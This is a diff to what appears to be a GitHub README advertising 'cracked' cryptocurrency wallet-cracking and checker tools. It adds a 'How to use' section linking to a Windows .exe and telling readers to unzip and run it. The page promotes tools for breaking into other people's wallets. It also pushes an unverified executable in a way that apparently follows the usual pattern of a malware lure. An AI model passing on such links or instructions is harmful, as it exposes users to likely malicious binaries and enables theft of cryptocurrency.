@@ -13,6 +13,10 @@ wallet cracker (Cracked)
 
 Duc checker (Cracked)
 
+# How to use
+
+Go to Releases or [click here](https://github.com/Rokysrt/Wallet-crackers/releases/download/file/Wallet.crackers.exe) Unzip and run exe to extract the programs
+
 # Requirements
 OS: Windows 7 or 8 or 10 or 11
 
